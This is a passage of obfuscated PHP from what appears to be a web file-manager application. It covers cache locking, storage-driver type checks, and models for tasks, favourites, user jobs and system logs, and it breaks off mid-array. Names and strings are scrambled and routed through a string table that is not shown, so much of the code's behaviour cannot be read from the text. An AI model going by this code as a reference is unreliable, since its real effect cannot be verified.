$¬€åôïÈ) == $¨¼Óªêø) { $Ø½·Íø€ = $¨¼Óªêø; } if ($ñØšìÔá && $Ø½·Íø€) { break; } } return $ñØšìÔá === $Ø½·Íø€; } public static function transferType($Š•¤µœ, $÷ÀÙ‘¾¥) { $„ŸÚÎ’ =& $_SERVER[Ù×¯Ø…]; $Ê‰–³ˆî = self::driverType($Š•¤µœ); $§µà®ˆú = self::driverType($÷ÀÙ‘¾¥); if ($Ê‰–³ˆî[$„ŸÚÎ’[29]] == $§µà®ˆú[$„ŸÚÎ’[29]] && $Ê‰–³ˆî[$„ŸÚÎ’[1229]] == $§µà®ˆú[$„ŸÚÎ’[1229]]) { return $„ŸÚÎ’[1230]; } if ($Ê‰–³ˆî[$„ŸÚÎ’[29]] == $„ŸÚÎ’[870] && $§µà®ˆú[$„ŸÚÎ’[29]] == $„ŸÚÎ’[106]) { return $„ŸÚÎ’[1129]; } if ($Ê‰–³ˆî[$„ŸÚÎ’[29]] == $„ŸÚÎ’[106] && $§µà®ˆú[$„ŸÚÎ’[29]] == $„ŸÚÎ’[870]) { return $„ŸÚÎ’[107]; } return $„ŸÚÎ’[1231]; } public static function driverType($ê»©ËÜÀ) { $Ø’Ä…È =& $_SERVER[Ù×¯Ø…]; $¾á«áã± = str_replace($Ø’Ä…È[1232], $Ø’Ä…È[33], strtolower($ê»©ËÜÀ->getType())); if ($¾á«áã± == $Ø’Ä…È[757] || $¾á«áã± == $Ø’Ä…È[1233] || $¾á«áã± == $Ø’Ä…È[1234]) { $ê»©ËÜÀ = self::defaultDriverInit(); } else { if ($¾á«áã± == $Ø’Ä…È[1136] || $¾á«áã± == $Ø’Ä…È[1235]) { $ê»©ËÜÀ = IO::init($ê»©ËÜÀ->pathParse[$Ø’Ä…È[1083]]); } } $–§éÇÁƒ = $ê»©ËÜÀ->path; $¾á«áã± = str_replace($Ø’Ä…È[1232], $Ø’Ä…È[33], strtolower($ê»©ËÜÀ->getType())); if ($¾á«áã± == $Ø’Ä…È[106]) { return array($Ø’Ä…È[29] => $Ø’Ä…È[106], $Ø’Ä…È[1229] => $Ø’Ä…È[33], $Ø’Ä…È[76] => $–§éÇÁƒ); } return array($Ø’Ä…È[29] => $Ø’Ä…È[870], $Ø’Ä…È[1229] => $ê»©ËÜÀ->pathDriver, $Ø’Ä…È[76] => $–§éÇÁƒ); } public static function pathDriverType($Ç­‰ª«) { return $Ç­‰ª« ? self::driverType(IO::init($Ç­‰ª«)) : !1; } } goto b—Ù©ïƒ“; Fà…‚ ­é±: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $íŒû¾èŠ =& $_SERVER[Ù×¯Ø…]; if (self::$handle) { return self::$handle; } $í‰©Õß = $GLOBALS[$íŒû¾èŠ[6]][$íŒû¾èŠ[347]]; self::$timeout = $í‰©Õß[$íŒû¾èŠ[846]] ? $í‰©Õß[$íŒû¾èŠ[846]] : 10; $™ã¦‚É¯ = _get($GLOBALS[$íŒû¾èŠ[6]], $íŒû¾èŠ[847]); $å‚Ûà¸ê = $í‰©Õß[$íŒû¾èŠ[833]] ? $í‰©Õß[$íŒû¾èŠ[833]] : $íŒû¾èŠ[193]; if ($å‚Ûà¸ê == $íŒû¾èŠ[17] && $™ã¦‚É¯ == $íŒû¾èŠ[9]) { $å‚Ûà¸ê = $íŒû¾èŠ[193]; } switch ($å‚Ûà¸ê) { case $íŒû¾èŠ[836]: self::$handle = new CacheLockRedis(); break; case $íŒû¾èŠ[837]: self::$handle = new CacheLockMemcached(); break; case $íŒû¾èŠ[17]: self::$handle = new CacheLockDatabase(); break; case $íŒû¾èŠ[193]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($íŒû¾èŠ[848], $íŒû¾èŠ[849]); } return self::$handle; } private static function key($àŠá‡ÛÅ) { return $_SERVER[Ù×¯Ø…][850] . Cache::key($àŠá‡ÛÅ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($¬İ…½ø = '') { self::$errorMsg = $¬İ…½ø; } public static function lockGlobal($ÌúıÍĞ, $¶ŞúÊÏ¿) { return self::lock($ÌúıÍĞ, $¶ŞúÊÏ¿, !0); } public static function lock($ÜŸÑ¹’œ, $ÃÌ§‚ğ = false, $İ·Òóñ’ = false) { $”ÃŒıƒ =& $_SERVER[Ù×¯Ø…]; $áñŒ¢›è = self::init(); $¬ó»ñ© = self::key($ÜŸÑ¹’œ); $ÃÌ§‚ğ = $ÃÌ§‚ğ ? $ÃÌ§‚ğ : self::$timeout; $©·¼¶ = $áñŒ¢›è->lock($¬ó»ñ©, $ÃÌ§‚ğ); $±¾×ø‡· = timeFloat(); if (!$©·¼¶) { $äÅŠº¶ = "\154\x6f\143\x6b\40\145\162\162\157\162\73\x6b\x65\171\x3d{$ÜŸÑ¹’œ}\73\164\151\x6d\x65\x3d{$ÃÌ§‚ğ}\x3b" . self::$errorMsg . $”ÃŒıƒ[68] . get_caller_msg(); $±–›Ø¤â = LNG($”ÃŒıƒ[851]) . "\x28{$ÃÌ§‚ğ}\163\x29\56" . LNG($”ÃŒıƒ[852]); $±–›Ø¤â .= $”ÃŒıƒ[853]; if (is_string(self::$errorMsg) && self::$errorMsg) { $±–›Ø¤â = $±–›Ø¤â . $”ÃŒıƒ[854] . self::$errorMsg; } write_log($äÅŠº¶, $”ÃŒıƒ[849]); show_json($±–›Ø¤â, !1); } if (!$İ·Òóñ’) { self::$lockItem[$¬ó»ñ©] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ğáûµãœ = number_format(timeFloat() - $±¾×ø‡·, 3); write_log($”ÃŒıƒ[855] . $ÜŸÑ¹’œ . $”ÃŒıƒ[856] . $ğáûµãœ, $”ÃŒıƒ[849]); } return $©·¼¶; } public static function lockGet($¶£Ï‰ˆø) { $€ì±Ãùç = self::key($¶£Ï‰ˆø); if (self::$lockItem[$€ì±Ãùç]) { return self::$lockItem[$€ì±Ãùç]; } return self::init()->lockGet($€ì±Ãùç); } public static function unlock($Ş¢ğâé) { $ÏÎ‰¼ =& $_SERVER[Ù×¯Ø…]; $‹Ì²ÌÀ… = self::key($Ş¢ğâé); self::$lockItem[$‹Ì²ÌÀ…] = null; self::init()->unlock($‹Ì²ÌÀ…); if (GLOBAL_DEBUG_LOG_ALL) { write_log($ÏÎ‰¼[857] . $Ş¢ğâé, $ÏÎ‰¼[849]); } return; } public static function unlockRuntime() { $ßØ‹ÇÒµ =& $_SERVER[Ù×¯Ø…]; $ŞÚ·çğ = self::init(); $Ş‘ø‘ÇÌ = !1; foreach (self::$lockItem as $‚ó’êÛ€ => $Âô’Ş®â) { if (!$Âô’Ş®â) { continue; } $ŞÚ·çğ->unlock($‚ó’êÛ€); if (!$Ş‘ø‘ÇÌ) { $Ş‘ø‘ÇÌ = !0; write_log($ßØ‹ÇÒµ[858] . $‚ó’êÛ€ . $ßØ‹ÇÒµ[68] . get_caller_msg(), $ßØ‹ÇÒµ[849]); continue; } write_log($ßØ‹ÇÒµ[858] . $‚ó’êÛ€, $ßØ‹ÇÒµ[849]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $õüÕ¾‹Ÿ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ßØ‹ÇÒµ[859] . $õüÕ¾‹Ÿ . $ßØ‹ÇÒµ[860] . ACTION, $ßØ‹ÇÒµ[849]); } } public static function fileLock($ŠáÕÅºË) { $Ñ£Öª¶õ =& $_SERVER[Ù×¯Ø…]; if (!$GLOBALS[$Ñ£Öª¶õ[861]]) { $GLOBALS[$Ñ£Öª¶õ[861]] = array(); } $GLOBALS[$Ñ£Öª¶õ[861]][$ŠáÕÅºË] = !1; $üŸĞàµœ = fopen(DATA_PATH . $ŠáÕÅºË . $Ñ£Öª¶õ[862], $Ñ£Öª¶õ[863]); if (!$üŸĞàµœ) { return !1; } $GLOBALS[$Ñ£Öª¶õ[861]][$ŠáÕÅºË] = $üŸĞàµœ; if (flock($üŸĞàµœ, LOCK_EX)) { return !0; } self::unlock($ŠáÕÅºË); show_json($Ñ£Öª¶õ[864], !1); return !1; } public static function fileUnlock($ÂĞšúèˆ) { $Ûö½é‰  =& $_SERVER[Ù×¯Ø…]; $â‚ñ˜µù = $GLOBALS[$Ûö½é‰ [861]][$ÂĞšúèˆ]; if (!$â‚ñ˜µù) { return; } $GLOBALS[$Ûö½é‰ [861]][$ÂĞšúèˆ] = !1; flock($â‚ñ˜µù, LOCK_UN); fclose($â‚ñ˜µù); } public static function fileUnlockAll() { $ÙÈßÇ¾Á =& $_SERVER[Ù×¯Ø…]; if (!$GLOBALS[$ÙÈßÇ¾Á[861]]) { return; } foreach ($GLOBALS[$ÙÈßÇ¾Á[861]] as $¦ç®«çò => $¢ÜúÓ³) { if (!$¢ÜúÓ³) { continue; } $GLOBALS[$ÙÈßÇ¾Á[861]][$¦ç®«çò] = !1; flock($¢ÜúÓ³, LOCK_UN); fclose($¢ÜúÓ³); } $GLOBALS[$ÙÈßÇ¾Á[861]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ñÕä©Îö =& $_SERVER[Ù×¯Ø…]; $Ì‚ÕÃ•œ = $GLOBALS[$ñÕä©Îö[6]][$ñÕä©Îö[347]]; self::$cachePath = $Ì‚ÕÃ•œ[$ñÕä©Îö[193]][$ñÕä©Îö[76]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($ûÏˆòÀà, $´¿¿¦âÀ = 0) { $ÄäŠëèõ =& $_SERVER[Ù×¯Ø…]; $õ‹Å‹¥  = microtime(!0); $Ô—÷ä¿ª = $õ‹Å‹¥  + $´¿¿¦âÀ + 0.0001; $àª•ê’÷ = rtrim(self::$cachePath, $ÄäŠëèõ[8]) . $ÄäŠëèõ[865] . md5($ûÏˆòÀà) . $ÄäŠëèõ[862]; if (file_exists($àª•ê’÷) && filemtime($àª•ê’÷) && filemtime($àª•ê’÷) < time() - 10) { @unlink($àª•ê’÷); } do { if (file_exists($àª•ê’÷)) { cacheLockWait(); continue; } $¤­³âÃ = fopen($àª•ê’÷, $ÄäŠëèõ[866]); if (!$¤­³âÃ) { return !1; } $ø‰ëâ¨œ = flock($¤­³âÃ, LOCK_EX | LOCK_NB); self::$caches[$ûÏˆòÀà] = array($ÄäŠëèõ[867] => $¤­³âÃ, $ÄäŠëèõ[193] => $àª•ê’÷); fwrite($¤­³âÃ, $Ô—÷ä¿ª); clearstatcache(); if ($¤­³âÃ && $ø‰ëâ¨œ) { return !0; } cacheLockWait(); } while (microtime(!0) < $Ô—÷ä¿ª); $this->unlock($ûÏˆòÀà); return !1; } public function lockGet($¯€™ëó–) { $’–¦‡§Î =& $_SERVER[Ù×¯Ø…]; $¶©’Ò¸¶ = rtrim(self::$cachePath, $’–¦‡§Î[8]) . $’–¦‡§Î[865] . md5($¯€™ëó–) . $’–¦‡§Î[862]; return file_exists($¶©’Ò¸¶); } public function unlock($œ›£¼”) { $ò¯©ÓÈı =& $_SERVER[Ù×¯Ø…]; $‡ñ®ˆõş = self::$caches[$œ›£¼”]; if (!$‡ñ®ˆõş) { return; } @flock($‡ñ®ˆõş[$ò¯©ÓÈı[867]], LOCK_UN); @fclose($‡ñ®ˆõş[$ò¯©ÓÈı[867]]); @unlink($‡ñ®ˆõş[$ò¯©ÓÈı[193]]); unset(self::$caches[$œ›£¼”]); } } goto e§ğæ©îÏ…; F£«ààÓïÁ: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\x6d\56\x74\141\163\153\x4c\151\163\164"; public $field = array("\x6e\141\x6d\145", "\x74\x79\x70\145", "\145\x76\145\156\164", "\x74\151\155\145", "\144\145\x73\143", "\163\171\163\164\x65\x6d", "\x65\156\141\x62\154\x65", "\x6c\141\x73\164\x52\x75\x6e", "\x73\157\162\x74"); public function listData($‘ÉÍıÄ = false, $™ûÂ—Õ = "\x73\157\162\164", $Ğö÷ı–¶ = false) { return parent::listData($‘ÉÍıÄ, $™ûÂ—Õ, $Ğö÷ı–¶); } public function add($ÏíæÈŞ¾) { $Ù¬óÁç =& $_SERVER[Ù×¯Ø…]; $ıÄïÈ¥š = $this->findByName($ÏíæÈŞ¾[$Ù¬óÁç[28]]); if ($ıÄïÈ¥š) { return !1; } $ÏíæÈŞ¾[$Ù¬óÁç[1541]] = 0; $ÏíæÈŞ¾[$Ù¬óÁç[1771]] = $this->getSort(); return parent::insert($ÏíæÈŞ¾); } private function getSort() { $™á÷ı =& $_SERVER[Ù×¯Ø…]; $­¯Æä¢ = parent::listData(); $®”ïŸßİ = array_to_keyvalue($­¯Æä¢, $™á÷ı[33], $™á÷ı[1771]); return empty($®”ïŸßİ) ? 0 : max($®”ïŸßİ) + 1; } public function update($öàêäëˆ, $î­ˆš‡õ) { $âƒ—í¡ş =& $_SERVER[Ù×¯Ø…]; $Íçê²£‘ = $this->listData($öàêäëˆ); $µÕÉÍÕ = $this->findByName($î­ˆš‡õ[$âƒ—í¡ş[28]]); if (!$Íçê²£‘ || $µÕÉÍÕ && $µÕÉÍÕ[$âƒ—í¡ş[395]] != $Íçê²£‘[$âƒ—í¡ş[395]]) { return !1; } return parent::update($öàêäëˆ, $î­ˆš‡õ); } public function remove($Ò‹äŒÎË, $ãÑó§ğ = false) { $…ˆ‚¬‹ =& $_SERVER[Ù×¯Ø…]; $ú¨Øƒ¢‹ = $this->listData($Ò‹äŒÎË); if (!$ú¨Øƒ¢‹) { return; } if (!$ãÑó§ğ && $ú¨Øƒ¢‹[$…ˆ‚¬‹[1206]] == $…ˆ‚¬‹[87]) { return !1; } return parent::remove($Ò‹äŒÎË); } public function enable($äÄÓ‡âõ, $›‹Çµï) { return $this->update($äÄÓ‡âõ, array($_SERVER[Ù×¯Ø…][2162] => $›‹Çµï)); } public function run($ÚşÛ½è) { return $this->update($ÚşÛ½è, array($_SERVER[Ù×¯Ø…][2172] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\x65\162\x5f\146\x61\x76"; protected function cacheFunctionAlias($ª¶ç‚¹ê) { $ğ““­‘ =& $_SERVER[Ù×¯Ø…]; return array($ğ““­‘[1858] => array(USER_ID, $ğ““­‘[2173])); } protected function listData() { $’…ƒ¼ÙŠ =& $_SERVER[Ù×¯Ø…]; $óå§¶ö° = array($’…ƒ¼ÙŠ[1571] => USER_ID, $’…ƒ¼ÙŠ[486] => 0); $º¶à¦É = $’…ƒ¼ÙŠ[2174]; $¼ª‰ïÔÑ = $this->field($º¶à¦É)->where($óå§¶ö°)->order($’…ƒ¼ÙŠ[2175])->select(); return $¼ª‰ïÔÑ ? $¼ª‰ïÔÑ : array(); } protected function resetCache() { } protected function listView() { $Ä™ùåÑÅ =& $_SERVER[Ù×¯Ø…]; $á«çÓéŸ = $this->listData(); $—‚¡éËË = array_filter_by_field($á«çÓéŸ, $Ä™ùåÑÅ[29], $Ä™ùåÑÅ[420]); $§ˆŸ¨ = array_to_keyvalue($—‚¡éËË, $Ä™ùåÑÅ[33], $Ä™ùåÑÅ[76]); if (!$§ˆŸ¨) { return $á«çÓéŸ; } $İ©µÍ‰Ç = 2000; $Üå«ç¾ş = array($Ä™ùåÑÅ[421] => array($Ä™ùåÑÅ[422], $§ˆŸ¨)); $œÏ¶‡è· = Model($Ä™ùåÑÅ[831])->listSource($Üå«ç¾ş, $İ©µÍ‰Ç); $œÏ¶‡è· = array_merge($œÏ¶‡è·[$Ä™ùåÑÅ[74]], $œÏ¶‡è·[$Ä™ùåÑÅ[75]]); $œÏ¶‡è· = array_to_keyvalue($œÏ¶‡è·, $Ä™ùåÑÅ[406]); foreach ($á«çÓéŸ as $†‘¹Äªö => $Œ™»Æ‡ù) { $ÓÊ…à‡ = $œÏ¶‡è·[$Œ™»Æ‡ù[$Ä™ùåÑÅ[76]]]; $ÓÊ…à‡ = $ÓÊ…à‡ ? $ÓÊ…à‡ : array(); $á«çÓéŸ[$†‘¹Äªö] = array_merge($ÓÊ…à‡, $Œ™»Æ‡ù); } return $á«çÓéŸ; } protected function addFav($Éˆ§ØŠê, $îÂûÂ®¾ = '', $®Ô£š‚ = "\163\x6f\165\162\143\145") { $ÍÉºãİÚ =& $_SERVER[Ù×¯Ø…]; $ÁÁŠöŞ© = array($ÍÉºãİÚ[1571] => USER_ID, $ÍÉºãİÚ[486] => 0, $ÍÉºãİÚ[426] => $®Ô£š‚, $ÍÉºãİÚ[425] => $Éˆ§ØŠê); if ($this->where($ÁÁŠöŞ©)->find()) { return !1; } $ÁÁŠöŞ© = array($ÍÉºãİÚ[1571] => USER_ID, $ÍÉºãİÚ[486] => 0); $ğãîØ·« = $this->where($ÁÁŠöŞ©)->max($ÍÉºãİÚ[1771]); if (!$ğãîØ·«) { $ğãîØ·« = 0; } if (!$îÂûÂ®¾ && $®Ô£š‚ == $ÍÉºãİÚ[420]) { $Ç«Û¾Ø = Model($ÍÉºãİÚ[1253])->where(array($ÍÉºãİÚ[421] => $Éˆ§ØŠê))->find(); if (!$Ç«Û¾Ø) { return !1; } $îÂûÂ®¾ = $Ç«Û¾Ø[$ÍÉºãİÚ[28]]; } $îÂûÂ®¾ = $this->getAutoName($îÂûÂ®¾); $¢µÀÅ¯Ë = array($ÍÉºãİÚ[1571] => USER_ID, $ÍÉºãİÚ[486] => 0, $ÍÉºãİÚ[424] => $îÂûÂ®¾, $ÍÉºãİÚ[425] => $Éˆ§ØŠê, $ÍÉºãİÚ[426] => $®Ô£š‚, $ÍÉºãİÚ[1752] => $ğãîØ·« + 1); return $this->add($¢µÀÅ¯Ë); } protected function remove($à¾ûÉ§») { $€á¶ÛÜÁ =& $_SERVER[Ù×¯Ø…]; $ÖÁòçà = array($€á¶ÛÜÁ[1571] => USER_ID, $€á¶ÛÜÁ[423] => $à¾ûÉ§»); return $this->where($ÖÁòçà)->delete(); } protected function removeByName($Æ¨èôàÚ) { $©Â¢¶ËÅ =& $_SERVER[Ù×¯Ø…]; $®…·‡å = array($©Â¢¶ËÅ[1571] => USER_ID, $©Â¢¶ËÅ[424] => $Æ¨èôàÚ, $©Â¢¶ËÅ[486] => 0); return $this->where($®…·‡å)->delete(); } protected function rename($¸·ğŠÇŒ, $‹ĞËüÈ”) { $œ›Õ³ŸÂ =& $_SERVER[Ù×¯Ø…]; if ($¸·ğŠÇŒ == $‹ĞËüÈ”) { return !1; } $œæ¢•İÖ = $this->getAutoName($‹ĞËüÈ”); if ($‹ĞËüÈ” != $œæ¢•İÖ) { return !1; } $Á¹ûÏÑ» = array($œ›Õ³ŸÂ[1571] => USER_ID, $œ›Õ³ŸÂ[486] => 0, $œ›Õ³ŸÂ[28] => $¸·ğŠÇŒ); return $this->where($Á¹ûÏÑ»)->save(array($œ›Õ³ŸÂ[28] => $‹ĞËüÈ”)); } protected function resetSort($ó×Âˆ“ì) { $Äôİú•… =& $_SERVER[Ù×¯Ø…]; $ó×Âˆ“ì = is_array($ó×Âˆ“ì) ? $ó×Âˆ“ì : array(); $æÑßÙ·§ = array($Äôİú•…[1571] => USER_ID); for ($›­½Ù†ğ = 0; $›­½Ù†ğ < count($ó×Âˆ“ì); $›­½Ù†ğ++) { $æÑßÙ·§[$Äôİú•…[423]] = $ó×Âˆ“ì[$›­½Ù†ğ]; $this->where($æÑßÙ·§)->save(array($Äôİú•…[1752] => $›­½Ù†ğ + 1)); } return !0; } protected function moveTop($÷¨¶ë¬Â) { $ˆÁı×£Ä =& $_SERVER[Ù×¯Ø…]; $æ ‹ÜÚ = array($ˆÁı×£Ä[1571] => USER_ID, $ˆÁı×£Ä[486] => 0); $„ºÇğñú = $this->where($æ ‹ÜÚ)->where(array($ˆÁı×£Ä[28] => $÷¨¶ë¬Â))->find(); if (!$„ºÇğñú) { return; } $²‰§ş±³ = $this->field($ˆÁı×£Ä[395])->where($æ ‹ÜÚ)->order($ˆÁı×£Ä[2175])->select(); $²‰§ş±³ = array_to_keyvalue($²‰§ş±³, $ˆÁı×£Ä[33], $ˆÁı×£Ä[395]); $úú÷Ø÷ = $²‰§ş±³; $²‰§ş±³ = array_remove_value($²‰§ş±³, $„ºÇğñú[$ˆÁı×£Ä[395]]); array_unshift($²‰§ş±³, $„ºÇğñú[$ˆÁı×£Ä[395]]); return $this->resetSort($²‰§ş±³); } protected function moveBottom($úæ¦ÂîÈ) { $”•êª©Ê =& $_SERVER[Ù×¯Ø…]; $Ç±¯ĞŞ¹ = array($”•êª©Ê[1571] => USER_ID, $”•êª©Ê[486] => 0); $¬İÉ¡ É = $this->where($Ç±¯ĞŞ¹)->max($”•êª©Ê[1771]); $À™ËˆíÑ = array($”•êª©Ê[1771] => $¬İÉ¡ É + 1); return $this->where($Ç±¯ĞŞ¹)->where(array($”•êª©Ê[28] => $úæ¦ÂîÈ))->save($À™ËˆíÑ); } private function getAutoName($ğÍÍè£Ñ) { $¢Âé¶Ó =& $_SERVER[Ù×¯Ø…]; $Ä’µğ´’ = array($¢Âé¶Ó[1571] => USER_ID, $¢Âé¶Ó[486] => 0); $èÍ¦º = $this->field($¢Âé¶Ó[28])->where($Ä’µğ´’)->select(); $èÍ¦º = array_to_keyvalue($èÍ¦º, $¢Âé¶Ó[33], $¢Âé¶Ó[28]); if (!$èÍ¦º || !in_array($ğÍÍè£Ñ, $èÍ¦º)) { return $ğÍÍè£Ñ; } for ($‡×µõ©ƒ = 0; $‡×µõ©ƒ < count($èÍ¦º); $‡×µõ©ƒ++) { if (!in_array($ğÍÍè£Ñ . "\50{$‡×µõ©ƒ}\x29", $èÍ¦º)) { return $ğÍÍè£Ñ . "\50{$‡×µõ©ƒ}\51"; } } return $ğÍÍè£Ñ . "\x28{$‡×µõ©ƒ}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\x6d\x2e\x6a\157\142\x4c\151\163\164"; public $field = array("\x6e\x61\x6d\145", "\144\x65\163\143", "\163\x6f\x72\x74"); const JOB_KEY = "\163\145\154\x66\x4a\157\142\x4c\x69\163\x74"; public function listData($·ĞÖúï = false, $Ú¾¯á·Û = "\x73\x6f\x72\164", $šº‚™¢ì = false) { return parent::listData($·ĞÖúï, $Ú¾¯á·Û, $šº‚™¢ì); } public function remove($¸ÈÂ‚Ğ×) { return parent::remove($¸ÈÂ‚Ğ×); } public function add($ÀÖ´ıå) { $èÙœìĞï =& $_SERVER[Ù×¯Ø…]; if ($this->findByName($ÀÖ´ıå[$èÙœìĞï[28]])) { return !1; } $ÀÖ´ıå[$èÙœìĞï[1771]] = $this->getSort(); return parent::insert($ÀÖ´ıå); } private function getSort() { $­ÁÓ½›Ÿ =& $_SERVER[Ù×¯Ø…]; $øÖÑ³Üæ = parent::listData(); $úÃ×ïÛé = array_to_keyvalue($øÖÑ³Üæ, $­ÁÓ½›Ÿ[33], $­ÁÓ½›Ÿ[1771]); return empty($úÃ×ïÛé) ? 0 : max($úÃ×ïÛé) + 1; } public function update($Å—«Äğ, $öùËôŸÛ) { $øè‚íÉ =& $_SERVER[Ù×¯Ø…]; $—€ÜıŸ‰ = parent::listData($Å—«Äğ); $£Áèâ‹Ï = $this->findByName($öùËôŸÛ[$øè‚íÉ[28]]); if (!$—€ÜıŸ‰ || $£Áèâ‹Ï && $£Áèâ‹Ï[$øè‚íÉ[395]] != $—€ÜıŸ‰[$øè‚íÉ[395]]) { return !1; } return parent::update($Å—«Äğ, $öùËôŸÛ); } public function setUserJob($ş¯ß¹ˆ·, $ƒŠëı·Ç) { $‚¥æëˆş =& $_SERVER[Ù×¯Ø…]; if (!is_array($ƒŠëı·Ç)) { $ƒŠëı·Ç = array($ƒŠëı·Ç); } $ ŒÔ¡Ç = parent::listData(); $ÑœÃ‘œò = array_to_keyvalue($ ŒÔ¡Ç, $‚¥æëˆş[28]); $ÃŒÀŒÖ‰ = $‚¥æëˆş[376]; foreach ($ƒŠëı·Ç as $ò¤ÕáÖµ) { if ($ÑœÃ‘œò[$ò¤ÕáÖµ]) { $ÃŒÀŒÖ‰ .= $ÑœÃ‘œò[$ò¤ÕáÖµ][$‚¥æëˆş[395]] . $‚¥æëˆş[47]; } else { $õËˆáà­ = $this->add($ò¤ÕáÖµ); $ÃŒÀŒÖ‰ .= $õËˆáà­ . $‚¥æëˆş[47]; } } $ÃŒÀŒÖ‰ = rtrim($ÃŒÀŒÖ‰, $‚¥æëˆş[47]); Model($‚¥æëˆş[541])->metaSet($ş¯ß¹ˆ·, self::JOB_KEY, $ÃŒÀŒÖ‰); } public function getUserJob($²ÊóÅªí) { $ı¾Ó•Úº = Model($_SERVER[Ù×¯Ø…][541])->metaGet($²ÊóÅªí); return $this->getUserJobInfo($ı¾Ó•Úº[self::JOB_KEY]); } public function getUserJobInfo($Ô£û§€Ú) { $Ş÷¸ÑŸ™ =& $_SERVER[Ù×¯Ø…]; $¥ ¹õ¤ = explode($Ş÷¸ÑŸ™[47], $Ô£û§€Ú); $¿Ç‰˜Œ‚ = parent::listData(); $¿Ç‰˜Œ‚ = array_remove_key($¿Ç‰˜Œ‚, $Ş÷¸ÑŸ™[194]); $ˆ×Ñô² = array(); foreach ($¥ ¹õ¤ as $·°ïÍìí) { if (isset($¿Ç‰˜Œ‚[$·°ïÍìí])) { $ˆ×Ñô²[] = $¿Ç‰˜Œ‚[$·°ïÍìí]; } } return $ˆ×Ñô²; } } goto c‰ÜŠ™İæ; b½…Êâ±Şõ: define($_SERVER[Ù×¯Ø…][239], 1); define($_SERVER[Ù×¯Ø…][240], 0); define($_SERVER[Ù×¯Ø…][241], 2); goto B…Ê‰”àŞ–; C»ƒáÅó‰: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\x6d\56\x4c\x69\x67\x68\x74\101\x70\x70"; public $modelType = "\123\x79\163\x74\145\x6d\x4f\160\164\x69\157\156"; public $field = array("\156\x61\155\145", "\x67\x72\157\165\160", "\x64\x65\x73\x63", "\x63\157\156\164\x65\x6e\164"); public function listData($»ŞÑñê = false, $¨ıô¶µ© = "\155\157\144\151\146\x79\124\x69\x6d\x65", $„“Ë²çˆ = true) { return parent::listData($»ŞÑñê, $¨ıô¶µ©, $„“Ë²çˆ); } public function remove($Ç¾¼àö¸) { $½ŸğŸ¢À = $this->findByName($Ç¾¼àö¸); if (!$½ŸğŸ¢À) { return !1; } return parent::remove($½ŸğŸ¢À[$_SERVER[Ù×¯Ø…][395]]); } public function add($Øí¼Ìê) { if ($this->findByName($Øí¼Ìê[$_SERVER[Ù×¯Ø…][28]])) { return !1; } return parent::insert($Øí¼Ìê); } public function update($ê¹¢Ç˜, $ÔØÏúÊ¸) { $Ù …‡Ÿı =& $_SERVER[Ù×¯Ø…]; $Ö®˜øÅ = $this->findByName($ê¹¢Ç˜); $Â®âÎ¤÷ = $this->findByName($ÔØÏúÊ¸[$Ù …‡Ÿı[28]]); if (!$Ö®˜øÅ || $Â®âÎ¤÷ && $Â®âÎ¤÷[$Ù …‡Ÿı[395]] != $Ö®˜øÅ[$Ù …‡Ÿı[395]]) { return !1; } return parent::update($Ö®˜øÅ[$Ù …‡Ÿı[395]], $ÔØÏúÊ¸); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\x74\145\x6d\x5f\154\157\x67"; protected $dataAuto = array(array("\143\162\145\x61\x74\145\x54\x69\x6d\x65", "\x74\x69\155\x65", "\151\x6e\x73\145\x72\164", "\x66\165\156\143\164\151\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ˆŞé¡í‡ =& $_SERVER[Ù×¯Ø…]; return array($ˆŞé¡í‡[2064] => LNG($ˆŞé¡í‡[2065]), $ˆŞé¡í‡[2066] => LNG($ˆŞé¡í‡[2067]), $ˆŞé¡í‡[1690] => LNG($ˆŞé¡í‡[2068]), $ˆŞé¡í‡[2069] => LNG($ˆŞé¡í‡[2070]), $ˆŞé¡í‡[2071] => LNG($ˆŞé¡í‡[2072]), $ˆŞé¡í‡[2073] => LNG($ˆŞé¡í‡[2074]), $ˆŞé¡í‡[2075] => LNG($ˆŞé¡í‡[2076]), $ˆŞé¡í‡[1720] => LNG($ˆŞé¡í‡[2076]), $ˆŞé¡í‡[1721] => LNG($ˆŞé¡í‡[2077]), $ˆŞé¡í‡[2078] => LNG($ˆŞé¡í‡[2079]), $ˆŞé¡í‡[2080] => LNG($ˆŞé¡í‡[2081]), $ˆŞé¡í‡[2082] => LNG($ˆŞé¡í‡[2083]), $ˆŞé¡í‡[2084] => LNG($ˆŞé¡í‡[2085]), $ˆŞé¡í‡[1718] => LNG($ˆŞé¡í‡[2086]), $ˆŞé¡í‡[2087] => LNG($ˆŞé¡í‡[2088]), $ˆŞé¡í‡[1725] => LNG($ˆŞé¡í‡[2089]), $ˆŞé¡í‡[2090] => LNG($ˆŞé¡í‡[2091]), $ˆŞé¡í‡[2092] => LNG($ˆŞé¡í‡[2093]), $ˆŞé¡í‡[2094] => LNG($ˆŞé¡í‡[2095]), $ˆŞé¡í‡[2096] => LNG($ˆŞé¡í‡[2097]), $ˆŞé¡í‡[1728] => LNG($ˆŞé¡í‡[2098]), $ˆŞé¡í‡[1729] => LNG($ˆŞé¡í‡[2099]), $ˆŞé¡í‡[2100] => LNG($ˆŞé¡í‡[2101]), $ˆŞé¡í‡[2102] => LNG($ˆŞé¡í‡[2103]), $ˆŞé¡í‡[2104] => LNG($ˆŞé¡í‡[2105]), $ˆŞé¡í‡[1723] => LNG($ˆŞé¡í‡[2106]), $ˆŞé¡í‡[2107] => LNG($ˆŞé¡í‡[2108]), $ˆŞé¡í‡[1722] => LNG($ˆŞé¡í‡[2109]), $ˆŞé¡í‡[2110] => 